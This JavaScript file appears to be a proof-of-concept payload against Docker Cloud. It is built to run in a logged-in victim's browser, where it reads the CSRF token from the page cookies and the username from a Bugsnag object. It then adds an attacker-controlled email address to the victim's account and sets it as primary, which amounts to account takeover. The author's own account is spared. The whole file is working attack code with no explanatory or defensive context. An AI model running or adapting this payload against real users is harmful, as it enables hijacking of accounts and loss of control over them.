if(!document.URL.includes('://cloud.docker.com/')) {
    window.open('https://cloud.docker.com/repository/docker/vitorfernandesmarques/csrfpoc', '_self');
}

var getCSRFToken = async function(cookies) {

    var CSRFToken = [];
    var cookiesSplited = await cookies.split(' ');
    CSRFToken[0] = window.Bugsnag.user.username;
    for(var i = 0; i < cookiesSplited.length; i++){
        if(cookiesSplited[i].includes('csrftoken')){
            if(cookiesSplited[i].split('=')[0].length === 9){
                CSRFToken[1] = cookiesSplited[i].replace('csrftoken=', '').replace(';', '');
            }
        }
    }
    return CSRFToken;
}

var changeEmail = function(cookies) {

    const myEmail = 'rapt00rr@protonmail.com';
    const user = cookies[0];
    console.log(user);
    if(user == 'vitorfernandesmarques') {
        console.log('You\'re Safe :)')
    }

    else{

    const csrfToken = cookies[1];

   const URLAddEmail = 'https://cloud.docker.com/v2/emailaddresses/';
   const URLSettings = 'https://cloud.docker.com/u/' + user + '/settings';

   const payload = {
       user: user,
       email: myEmail
   }

   const params = {
       headers: {
           'Content-Type' : 'application/json',
           'Refefer' : URLSettings,
           'X-CSRFToken' : csrfToken
       },
       body : JSON.stringify(payload),
       method : 'POST'
   }

   var data = [URLSettings, csrfToken];

   fetch(URLAddEmail, params)
    .then((response) => {
        resolvePromisse(response.json(), data);
    })
    .catch((error) => {
        console.log(error);
    })

}

    
}

var resolvePromisse = async function(request, data) {
    request
        .then((response) => {
            setPrimaryEmail(response.id, data);
        })
        .catch((e) => { console.log(e) })
}

var setPrimaryEmail = async function(id, data) {

    var data = data;
    console.log(data)

    const URLChangePrimaryEmail = 'https://cloud.docker.com/v2/emailaddresses/' + id;

    const payload = {
        primary: true,
    }
 
    const params = {
        headers: {
            'Content-Type' : 'application/json',
            'X-CSRFToken' : data[1]
        },
        body : JSON.stringify(payload),
        method : 'PATCH'
    }
 
    fetch(URLChangePrimaryEmail, params)
     .then((data) => {
         console.log(data.json());
     })
     .catch((error) => {
         console.log(error);
     })
}

var tokens = getCSRFToken(document.cookie);

tokens
    .then((result) => {
        changeEmail(result)
    })
    .catch((error) => {
        console.log(error);
    })